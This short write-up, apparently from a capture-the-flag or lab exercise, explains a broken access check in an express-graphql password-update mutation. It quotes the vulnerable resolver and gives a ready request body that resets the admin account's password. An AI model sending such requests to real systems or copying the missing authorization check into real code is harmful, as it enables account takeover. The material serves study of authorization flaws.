This application uses `express-graphql`, and defines the falowing mutation
```js
...
UpdatePassword: {
    type: ResponseType,
    args: {
        username: { type: new GraphQLNonNull(GraphQLString) },
        password: { type: new GraphQLNonNull(GraphQLString) }
    },
    resolve: async (root, args, request) => {
        return new Promise((resolve, reject) => {
            if (!request.user) return reject(new GraphQLError('Authentication required!'));

            db.updatePassword(args.username, args.password)
                .then(() => resolve(response("Password updated successfully!")))
                .catch(err => reject(new GraphQLError(err)));
        });
    }
},
...
```
Since it's checked only if the requesting user is logged in and not the same as the target user, and the old password is not requiered, a request can be made to chenge the password of the admin
```json
{
    "query":"mutation($username:String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }",
    "variables":{
        "username":"admin",
        "password":"asd"
    }
}
```
